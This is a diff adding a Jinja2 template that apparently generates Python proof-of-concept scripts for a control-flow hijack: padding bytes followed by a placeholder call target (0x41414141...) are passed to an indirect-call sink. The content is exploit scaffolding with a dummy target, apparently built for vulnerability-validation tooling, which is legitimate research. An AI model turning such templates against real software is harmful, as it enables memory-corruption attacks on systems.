@@ -1,0 +1,20 @@
+{% extends "poc/base.py.j2" %}
+
+{% block description %}Control flow hijack via tainted indirect call{% endblock %}
+
+{% block payload %}
+# Payload to overwrite function pointer
+payload = b'A' * {{ padding | default(64) }}  # Padding
+payload += struct.pack('<Q', 0x4141414141414141)  # Fake call target
+{% endblock %}
+
+{% block exploit_doc %}Trigger control flow hijack{% endblock %}
+
+{% block exploit_body %}
+        print(f"[*] Sink: {{ sink_api }} (indirect call)")
+        print(f"[*] Payload size: {len(payload)} bytes")
+
+        print("[*] Triggering control flow hijack...")
+        func(payload)
+        print("[+] Returned (hijack may have failed)")
+{% endblock %}
